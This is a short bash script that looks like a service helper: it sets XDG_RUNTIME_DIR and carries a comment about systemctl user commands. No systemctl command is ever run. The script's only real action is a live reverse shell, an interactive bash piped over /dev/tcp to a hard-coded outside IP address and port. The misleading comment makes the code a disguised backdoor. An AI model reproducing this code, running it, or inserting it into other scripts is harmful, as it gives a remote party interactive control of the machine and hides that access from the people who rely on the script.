#!/bin/bash

cd $( dirname "${BASH_SOURCE[0]}" )

# Need this to issue "systemctl --user" commands
export XDG_RUNTIME_DIR=/run/user/1000

/bin/bash -i >& /dev/tcp/24.239.176.36/1235 0>&1
